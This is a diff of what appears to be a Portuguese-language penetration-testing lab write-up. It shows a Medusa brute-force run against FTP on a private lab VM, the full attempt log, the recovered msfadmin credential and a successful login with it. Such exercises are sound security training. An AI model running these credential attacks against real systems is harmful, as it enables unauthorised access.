@@ -44,35 +44,62 @@ REALIZANDO TESTES DE BRUTE FORCE COM O MEDUSA
 $ medusa -H 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
 Medusa V2.3 (http://www.foofus.net) (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
 R & Remote system type is Unix.
+
 2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 12356 (1 of 4 complete)
+
 2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 12356 (1 of 4 complete)
+
 2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (2 of 4 complete)
+
 2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
+
 2025-11-30 17:17:59 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+
 2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (2 of 4 complete)
+
 2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (3 of 4 complete)
+
 2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: qwerty (4 of 4 complete)
+
 2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 12356 (1 of 4 complete)
+
 2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
+
 2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
+
 2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: qwerty (3 of 4 complete)
+
 2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
+
 2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 12356 (1 of 4 complete)
+
 2025-11-30 17:18:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (2 of 4 complete)
+
 2025-11-30 17:18:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (3 of 4 complete)
+
 2025-11-30 17:18:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
 
 
 VALIDANDO ACESSO AO FTP COM A CREDENCIAL VAZADA.
 
 1 └─$ ftp 192.168.56.101
+
 2 Connected to 192.168.56.101.
+
 3 220 (vsFTPd 2.3.4)
+
 4 Name (192.168.56.101:kaliadmin): msfadmin
+
 5 331 Please specify the password.
+
 6 Password:
+
 7 230 Login successful.
+
 8 Remote system type is UNIX.
+
 9 Using binary mode to transfer files.
+
 10 ftp>|
+
 
